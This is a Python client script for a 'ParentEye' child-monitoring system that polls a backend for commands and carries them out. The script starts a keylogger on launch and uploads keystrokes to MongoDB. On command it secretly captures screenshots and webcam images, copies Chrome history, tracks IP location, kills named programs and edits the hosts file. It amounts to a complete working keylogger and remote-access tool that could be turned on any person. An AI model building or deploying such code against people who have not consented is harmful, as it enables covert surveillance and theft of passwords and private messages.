"""
CLIENT SCRIPT - Runs on child's computer and syncs with MongoDB
Registers device and executes commands from the backend
"""
import requests
import json
import time
import threading
import socket
import os
import platform
import psutil
import base64
import sqlite3
from io import BytesIO
from datetime import datetime
from pymongo import MongoClient
from pynput import keyboard
from dotenv import load_dotenv
import pyautogui
import cv2

# Load environment variables from .env file
load_dotenv()

# Configuration - FROM ENVIRONMENT VARIABLES (SECURE)
BACKEND_URL = os.getenv('BACKEND_URL', 'http://localhost:5000')
MONGO_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
DB_NAME = os.getenv('DB_NAME', 'child_monitoring')
DEVICE_ID = socket.gethostname()
DEVICE_NAME = f"{platform.node()} - {platform.system()}"

# MongoDB Connection
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
keystrokes_col = db["keystrokes"]

# Global variables
keylogger_running = False
captured_text = ""
listener = None

# ==================== KEYSTROKE LOGGING ====================

def on_press(key):
    """Capture keystrokes in readable English format"""
    global captured_text, keylogger_running
    
    if not keylogger_running:
        return False
    
    try:
        # Handle regular printable characters
        if hasattr(key, 'char') and key.char and key.char.isprintable():
            captured_text += key.char
            print(f"Key: {key.char}")
        # Handle special keys in readable format
        else:
            if key == keyboard.Key.space:
                captured_text += " "
            elif key == keyboard.Key.enter:
                captured_text += " [ENTER] "  # Show Enter was pressed
                send_keystrokes()
            elif key == keyboard.Key.backspace:
                if captured_text:
                    captured_text = captured_text[:-1]
            elif key == keyboard.Key.tab:
                captured_text += " [TAB] "
            # Ignore other special keys (shift, ctrl, alt, etc.) for cleaner output
        
        # Auto-send if buffer gets too large (500 chars)
        if len(captured_text) > 500:
            send_keystrokes()
            
    except AttributeError:
        pass

def send_keystrokes():
    """Send keystrokes to backend"""
    global captured_text
    
    if captured_text and captured_text.strip():  # Only send if there's actual content
        try:
            keystroke_doc = {
                "device_id": DEVICE_ID,
                "text": captured_text.strip(),
                "created_at": datetime.now()
            }
            keystrokes_col.insert_one(keystroke_doc)
            print(f"Sent keystrokes: {captured_text[:50]}...")  # Show preview
            captured_text = ""
        except Exception as e:
            print(f"Error sending keystrokes: {e}")

def auto_save_keystrokes():
    """Automatically save keystrokes every 30 seconds"""
    while keylogger_running:
        time.sleep(30)  # Save every 30 seconds
        if captured_text and len(captured_text) > 0:
            send_keystrokes()

def start_keylogger():
    """Start keystroke listener with auto-save"""
    global keylogger_running, listener
    
    if keylogger_running:
        return
    
    keylogger_running = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Start auto-save thread
    autosave_thread = threading.Thread(target=auto_save_keystrokes, daemon=True)
    autosave_thread.start()
    
    print("✅ Keystroke monitoring started (auto-saves every 30 seconds)")

def stop_keylogger():
    """Stop keystroke listener"""
    global keylogger_running, listener
    
    keylogger_running = False
    if listener:
        listener.stop()
        listener = None
    print("Keylogger stopped")

# ==================== WEBSITE BLOCKING ====================

def block_websites(websites):
    """Block websites by modifying hosts file"""
    try:
        print(f"🚫 Attempting to block websites: {', '.join(websites)}")
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        redirect_ip = "127.0.0.1"
        
        # Read current hosts file
        with open(hosts_path, 'r') as file:
            hosts_content = file.read()
        
        # Add blocked websites
        new_entries = []
        for website in websites:
            # Remove http://, https://, and www prefix if present
            website = website.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
            
            if website and website not in hosts_content:
                new_entries.append(f"\n{redirect_ip} {website}")
                new_entries.append(f"\n{redirect_ip} www.{website}")
        
        if new_entries:
            with open(hosts_path, 'a') as file:
                file.writelines(new_entries)
            print(f"✅ Successfully blocked: {', '.join(websites)}")
            return {"success": True, "message": f"Blocked: {', '.join(websites)}"}
        else:
            print(f"ℹ️ Websites already blocked")
            return {"success": True, "message": "Websites already blocked"}
            
    except PermissionError:
        print("❌ ERROR: Administrator privileges required!")
        print("⚠️ Right-click client.py and select 'Run as administrator'")
        print("⚠️ Or run: run_client_as_admin.bat")
        return {"success": False, "message": "Admin privileges required"}
    except Exception as e:
        print(f"❌ Error blocking websites: {e}")
        return {"success": False, "message": str(e)}

def unblock_websites(websites):
    """Unblock websites by removing from hosts file"""
    try:
        print(f"✅ Attempting to unblock websites: {', '.join(websites)}")
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        
        # Read hosts file
        with open(hosts_path, 'r') as file:
            lines = file.readlines()
        
        # Filter out blocked websites
        filtered_lines = []
        removed_count = 0
        for line in lines:
            should_keep = True
            for website in websites:
                # Clean website name
                website = website.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
                if website in line and '127.0.0.1' in line:
                    should_keep = False
                    removed_count += 1
                    break
            if should_keep:
                filtered_lines.append(line)
        
        # Write back
        with open(hosts_path, 'w') as file:
            file.writelines(filtered_lines)
        
        if removed_count > 0:
            print(f"✅ Successfully unblocked: {', '.join(websites)} ({removed_count} entries removed)")
            return {"success": True, "message": f"Unblocked: {', '.join(websites)}"}
        else:
            print(f"ℹ️ Websites were not blocked")
            return {"success": True, "message": "Websites were not blocked"}
            
    except PermissionError:
        print("❌ ERROR: Administrator privileges required!")
        print("⚠️ Right-click client.py and select 'Run as administrator'")
        print("⚠️ Or run: run_client_as_admin.bat")
        return {"success": False, "message": "Admin privileges required"}
    except Exception as e:
        print(f"❌ Error unblocking websites: {e}")
        return {"success": False, "message": str(e)}

# ==================== EXE BLOCKING ====================

blocked_exes = []
exe_monitor_running = False

def block_exe(exe_name):
    """Block execution of specific programs"""
    global blocked_exes, exe_monitor_running
    try:
        # Clean exe name (remove .exe if present, lowercase)
        exe_name = exe_name.lower().replace('.exe', '')
        
        if exe_name not in blocked_exes:
            blocked_exes.append(exe_name)
            print(f"🚫 Added to block list: {exe_name}")
        else:
            print(f"ℹ️ {exe_name} already in block list")
        
        # Start monitoring thread if not already running
        if not exe_monitor_running:
            exe_monitor_running = True
            monitor_thread = threading.Thread(target=monitor_blocked_exes, daemon=True, name='exe_monitor')
            monitor_thread.start()
            print("✅ EXE monitor started")
        
        # Immediately kill any running instances
        kill_blocked_processes()
        return True  # Return success
        
    except Exception as e:
        print(f"❌ Error blocking exe: {e}")
        return False  # Return failure

def unblock_exe(exe_name):
    """Remove application from block list"""
    global blocked_exes, exe_monitor_running
    try:
        exe_name = exe_name.lower().replace('.exe', '')
        
        if exe_name in blocked_exes:
            blocked_exes.remove(exe_name)
            print(f"✅ Removed from block list: {exe_name}")
            
            # Stop monitor if no more blocked apps
            if len(blocked_exes) == 0:
                exe_monitor_running = False
                print("ℹ️ No more blocked apps, monitor stopping")
        else:
            print(f"ℹ️ {exe_name} was not in block list")
        
        return True  # Return success
            
    except Exception as e:
        print(f"❌ Error unblocking exe: {e}")
        return False  # Return failure

def kill_blocked_processes():
    """Kill all currently running blocked processes"""
    try:
        killed = []
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                proc_name = proc.info['name'].lower().replace('.exe', '')
                for blocked in blocked_exes:
                    if blocked in proc_name:
                        proc.kill()
                        killed.append(proc.info['name'])
                        print(f"🚫 Killed: {proc.info['name']} (PID: {proc.info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        if killed:
            print(f"✅ Terminated {len(killed)} blocked process(es)")
    except Exception as e:
        print(f"Error killing processes: {e}")

def monitor_blocked_exes():
    """Continuously monitor and kill blocked processes"""
    global exe_monitor_running
    print("👀 EXE monitoring active...")
    
    while exe_monitor_running and len(blocked_exes) > 0:
        try:
            kill_blocked_processes()
            time.sleep(2)  # Check every 2 seconds
        except Exception as e:
            print(f"Monitor error: {e}")
            time.sleep(5)

# ==================== LOCATION TRACKING ====================

def get_location():
    """Get device location using IP-based geolocation (simplified and reliable)"""
    try:
        print("📍 Getting location...")
        
        # Get public IP
        try:
            ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
            ip_address = ip_response.json().get('ip', 'Unknown')
            print(f"🌐 IP Address: {ip_address}")
        except Exception as e:
            print(f"Could not get IP: {e}")
            ip_address = "Unknown"
        
        # Try ip-api.com (free, no key needed, reliable)
        try:
            location_response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=10)
            location_data = location_response.json()
            
            if location_data.get('status') == 'success':
                location = {
                    "method": "IP-based",
                    "ip": ip_address,
                    "country": location_data.get('country', 'Unknown'),
                    "region": location_data.get('regionName', 'Unknown'),
                    "city": location_data.get('city', 'Unknown'),
                    "zip": location_data.get('zip', 'Unknown'),
                    "lat": location_data.get('lat', 0),
                    "lon": location_data.get('lon', 0),
                    "isp": location_data.get('isp', 'Unknown'),
                    "timezone": location_data.get('timezone', 'Unknown'),
                    "timestamp": datetime.now().isoformat()
                }
                print(f"✅ Location: {location['city']}, {location['region']}, {location['country']}")
                return location
            else:
                print(f"IP API error: {location_data.get('message', 'Unknown error')}")
                return {"error": "Could not determine location", "ip": ip_address}
        except Exception as e:
            print(f"❌ Error getting location: {e}")
            return {"error": str(e), "ip": ip_address}
            
    except Exception as e:
        print(f"❌ Location error: {e}")
        return {"error": str(e)}



def send_result(command_id, result):
    """Send command result to backend"""
    try:
        requests.post(
            f"{BACKEND_URL}/api/command/result/{command_id}",
            json={"result": result},
            timeout=5
        )
    except Exception as e:
        print(f"Error sending result: {e}")

def send_location_to_backend(location):
    """Send location to backend via API (new endpoint)"""
    try:
        if location and "lat" in location and "lon" in location:
            payload = {
                "device_id": DEVICE_ID,
                "latitude": location.get("lat", 0),
                "longitude": location.get("lon", 0),
                "accuracy": location.get("accuracy", 0)
            }
            response = requests.post(
                f"{BACKEND_URL}/api/send-location",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                print("✅ Location sent to backend")
                return True
    except Exception as e:
        print(f"Error sending location: {e}")
    return False

def send_browser_history_to_backend(history):
    """Send browser history to backend via API"""
    try:
        if history:
            payload = {
                "device_id": DEVICE_ID,
                "history": history
            }
            response = requests.post(
                f"{BACKEND_URL}/api/send-browser-history",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                print(f"✅ Browser history sent to backend ({len(history)} entries)")
                return True
    except Exception as e:
        print(f"Error sending browser history: {e}")
    return False

def send_app_usage_to_backend(usage):
    """Send app usage data to backend via API"""
    try:
        if usage:
            payload = {
                "device_id": DEVICE_ID,
                "usage": usage
            }
            response = requests.post(
                f"{BACKEND_URL}/api/send-app-usage",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                print(f"✅ App usage sent to backend ({len(usage)} apps)")
                return True
    except Exception as e:
        print(f"Error sending app usage: {e}")
    return False

# ==================== DEVICE REGISTRATION ====================

def register_device():
    """Register device with backend"""
    try:
        data = {
            "device_id": DEVICE_ID,
            "device_name": DEVICE_NAME
        }
        response = requests.post(f"{BACKEND_URL}/api/register-device", json=data, timeout=5)
        if response.status_code == 200:
            print(f"Device registered: {response.json()}")
            return True
        else:
            print(f"Registration failed: {response.text}")
            return False
    except Exception as e:
        print(f"Error registering device: {e}")
        return False

# ==================== COMMAND EXECUTION ====================

def check_pending_commands():
    """Check for pending commands from backend"""
    try:
        response = requests.get(
            f"{BACKEND_URL}/api/commands/pending/{DEVICE_ID}",
            timeout=5
        )
        if response.status_code == 200:
            commands = response.json()
            if commands:  # Only print if there are commands
                print(f"\n📥 {len(commands)} pending command(s) found")
            for cmd in commands:
                execute_command(cmd)
    except requests.exceptions.RequestException as e:
        # Silently fail - don't spam console with connection errors
        pass
    except Exception as e:
        print(f"Error checking commands: {e}")

def execute_command(cmd):
    """Execute command received from backend"""
    command_type = cmd.get('command')
    command_id = cmd.get('_id')
    params = cmd.get('params', {})
    
    print(f"\n{'='*50}")
    print(f"📨 Executing command: {command_type}")
    print(f"{'='*50}")
    
    try:
        if command_type == "lock":
            print("🔒 Locking workstation...")
            os.system("rundll32.exe user32.dll,LockWorkStation")
            send_result(command_id, {"type": "lock", "success": True, "message": "Workstation locked"})
        
        elif command_type == "shutdown":
            print("🔌 Shutting down in 10 seconds...")
            os.system("shutdown /s /t 10")
            send_result(command_id, {"type": "shutdown", "success": True, "message": "Shutdown initiated"})
        
        elif command_type == "restart":
            print("🔄 Restarting in 10 seconds...")
            os.system("shutdown /r /t 10")
            send_result(command_id, {"type": "restart", "success": True, "message": "Restart initiated"})
        
        elif command_type == "logout":
            print("🚪 Logging out...")
            os.system("shutdown -l")
            send_result(command_id, {"type": "logout", "success": True, "message": "Logout initiated"})
        
        elif command_type == "keystrokes_start":
            start_keylogger()
            send_result(command_id, {"type": "keystrokes_start", "success": True, "message": "Keystroke monitoring started"})
        
        elif command_type == "keystrokes_stop":
            stop_keylogger()
            send_result(command_id, {"type": "keystrokes_stop", "success": True, "message": "Keystroke monitoring stopped"})
        
        # New unified blocking commands (block_site instead of block_website)
        elif command_type == "block_site":
            site = params.get('site', 'unknown.com')
            print(f"🚫 Blocking website: {site}")
            result = block_websites([site])
            success = result.get('success', False)
            message = result.get('message', 'Block operation completed')
            send_result(command_id, {"type": "block_site", "success": success, "message": message})
        
        elif command_type == "unblock_site":
            site = params.get('site', 'unknown.com')
            print(f"✅ Unblocking website: {site}")
            result = unblock_websites([site])
            success = result.get('success', False)
            message = result.get('message', 'Unblock operation completed')
            send_result(command_id, {"type": "unblock_site", "success": success, "message": message})
        
        # Old style commands for backward compatibility
        elif command_type == "block_website":
            websites = params.get('websites', [])
            print(f"Websites to block: {websites}")
            result = block_websites(websites)
            send_result(command_id, {"type": "block_website", **result})
        
        elif command_type == "unblock_website":
            websites = params.get('websites', [])
            print(f"Websites to unblock: {websites}")
            result = unblock_websites(websites)
            send_result(command_id, {"type": "unblock_website", **result})
        
        # New unified app blocking commands (block_app instead of block_exe)
        elif command_type == "block_app":
            app_name = params.get('app_name', 'unknown.exe')
            print(f"🚫 Blocking application: {app_name}")
            success = block_exe(app_name)
            send_result(command_id, {
                "type": "block_app",
                "success": success,
                "message": f"Blocked {app_name}" if success else f"Failed to block {app_name}"
            })
        
        elif command_type == "unblock_app":
            app_name = params.get('app_name', 'unknown.exe')
            print(f"✅ Unblocking application: {app_name}")
            success = unblock_exe(app_name)
            send_result(command_id, {
                "type": "unblock_app",
                "success": success,
                "message": f"Unblocked {app_name}" if success else f"Failed to unblock {app_name}"
            })
        
        # Old style commands for backward compatibility
        elif command_type == "block_exe":
            exe_name = params.get('exe_name', '')
            print(f"Application to block: {exe_name}")
            block_exe(exe_name)
            send_result(command_id, {"type": "block_exe", "success": True, "message": f"Blocked {exe_name}"})
        
        elif command_type == "unblock_exe":
            exe_name = params.get('exe_name', '')
            print(f"Application to unblock: {exe_name}")
            unblock_exe(exe_name)
            send_result(command_id, {"type": "unblock_exe", "success": True, "message": f"Unblocked {exe_name}"})
        
        elif command_type == "screenshot":
            print("📸 Capturing screenshot...")
            screenshot = pyautogui.screenshot()
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
            send_result(command_id, {"type": "screenshot", "image_base64": img_base64})
        
        elif command_type == "webcam":
            print("📷 Capturing webcam...")
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    _, img_encoded = cv2.imencode('.jpg', frame)
                    img_base64 = base64.b64encode(img_encoded.tobytes()).decode('utf-8')
                    send_result(command_id, {"type": "webcam", "image_base64": img_base64})
                else:
                    send_result(command_id, {"type": "webcam", "success": False, "message": "Unable to capture webcam"})
            except Exception as e:
                send_result(command_id, {"type": "webcam", "success": False, "message": str(e)})
        
        elif command_type == "chromehistory":
            print("🌐 Fetching Chrome history...")
            chrome_history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
            temp_history_db = "temp_chrome_history.db"
            try:
                os.system(f'copy "{chrome_history_path}" "{temp_history_db}"')
                conn = sqlite3.connect(temp_history_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                history = cursor.fetchall()
                conn.close()
                os.remove(temp_history_db)
                history_list = [{"url": url, "title": title} for url, title in history]
                
                # Send to backend (NEW)
                send_browser_history_to_backend(history_list)
                
                # Also send as result (for backward compatibility)
                send_result(command_id, {"type": "chromehistory", "data": history_list})
            except Exception as e:
                send_result(command_id, {"type": "chromehistory", "success": False, "message": str(e)})
        
        elif command_type == "get_location":
            print("📍 Location command received")
            location = get_location()
            
            # Send to backend via new endpoint (PRIMARY)
            send_location_to_backend(location)
            
            # Also send as result (for backward compatibility)
            send_result(command_id, location)
        
        elif command_type == "popup_alert":
            """Display popup alert on client"""
            print("⚠️ Displaying alert...")
            title = params.get('title', 'Alert!')
            message = params.get('message', 'Important message')
            priority = params.get('priority', 'normal')
            
            try:
                import ctypes
                # Create simple message box (Windows only)
                ctypes.windll.user32.MessageBoxW(0, message, title, 1)
                send_result(command_id, {
                    "type": "popup_alert",
                    "success": True,
                    "message": f"Alert displayed: {title}"
                })
            except Exception as e:
                send_result(command_id, {
                    "type": "popup_alert",
                    "success": False,
                    "message": str(e)
                })
        
        else:
            print(f"⚠️ Unknown command: {command_type}")
        
        # Mark command as executed
        requests.post(f"{BACKEND_URL}/api/command/executed/{command_id}", timeout=5)
        print(f"✅ Command marked as executed")
        
    except Exception as e:
        print(f"❌ Error executing command: {e}")
        import traceback
        traceback.print_exc()

# ==================== MAIN LOOP ====================

def sync_loop():
    """Continuously sync with backend"""
    while True:
        try:
            check_pending_commands()
            time.sleep(5)  # Check every 5 seconds
        except Exception as e:
            print(f"Sync error: {e}")
            time.sleep(10)

def send_periodic_location():
    """Send location to backend every 5 minutes"""
    while keylogger_running:
        try:
            location = get_location()
            send_location_to_backend(location)
            print(f"📍 Location ping sent to backend")
            time.sleep(300)  # Every 5 minutes
        except Exception as e:
            print(f"Location update error: {e}")
            time.sleep(60)

def send_periodic_app_usage():
    """Send app usage to backend periodically"""
    while keylogger_running:
        try:
            # Get list of running processes (simple app usage tracking)
            usage_data = []
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    usage_data.append({
                        "name": proc.info['name'],
                        "pid": proc.info['pid']
                    })
                except psutil.NoSuchProcess:
                    pass
            
            if usage_data:
                send_app_usage_to_backend(usage_data)
            
            time.sleep(600)  # Every 10 minutes
        except Exception as e:
            print(f"App usage tracking error: {e}")
            time.sleep(60)

def main():
    """Main function"""
    global keylogger_running
    
    print(f"\n{'='*60}")
    print(f"🚀 ParentEye Client Started")
    print(f"{'='*60}")
    print(f"Device ID: {DEVICE_ID}")
    print(f"Backend Server: {BACKEND_URL}")
    print(f"MongoDB: {MONGO_URI}")
    print(f"{'='*60}\n")
    
    # Register device
    if not register_device():
        print("Failed to register device. Retrying in 10 seconds...")
        time.sleep(10)
        return
    
    # Auto-start keylogger when device connects
    print("Auto-starting keystroke monitoring...")
    start_keylogger()
    
    # Start location update thread (every 5 minutes) - SENDS TO BACKEND
    location_thread = threading.Thread(target=send_periodic_location, daemon=True)
    location_thread.start()
    
    # Start app usage tracking thread (every 10 minutes)
    app_usage_thread = threading.Thread(target=send_periodic_app_usage, daemon=True)
    app_usage_thread.start()
    
    # Start sync thread
    sync_thread = threading.Thread(target=sync_loop, daemon=True)
    sync_thread.start()
    
    # Keep the script running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Shutting down client...")
        keylogger_running = False
        stop_keylogger()

if __name__ == "__main__":
    main()
